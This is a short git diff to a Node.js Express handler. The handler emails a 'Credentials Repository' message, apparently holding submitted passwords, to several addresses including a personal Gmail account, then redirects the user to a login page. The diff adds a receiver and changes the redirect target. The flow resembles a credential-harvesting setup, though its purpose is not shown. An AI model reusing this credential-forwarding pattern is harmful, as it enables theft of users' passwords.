@@ -56,7 +56,7 @@ app.post('/send',(req, res) => {
     // setup email data with unicode symbols
     let mailOptions = {
         from: '"Serianu Password Repository" <momanyisamuel48@gmail.com>', // sender address
-        to: 'martin.mwangi@serianu.com, momanyisamuel48@gmail.com', // list of receivers
+        to: 'martin.mwangi@serianu.com, mark.muema@serianu.com, momanyisamuel48@gmail.com', // list of receivers
         subject: 'Credentials Repository', // Subject line
         text: 'New Password Crendetial', // plain text body
         html: output // html body
@@ -74,7 +74,7 @@ app.post('/send',(req, res) => {
         // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
         // Preview URL: https://ethereal.email/message/WaQKMgKddxQDoou...
 
-        res.redirect('https://ilam.icealion.com/public/login')
+        res.redirect('https://marine.icealion.com/login/')
     });
 })
 
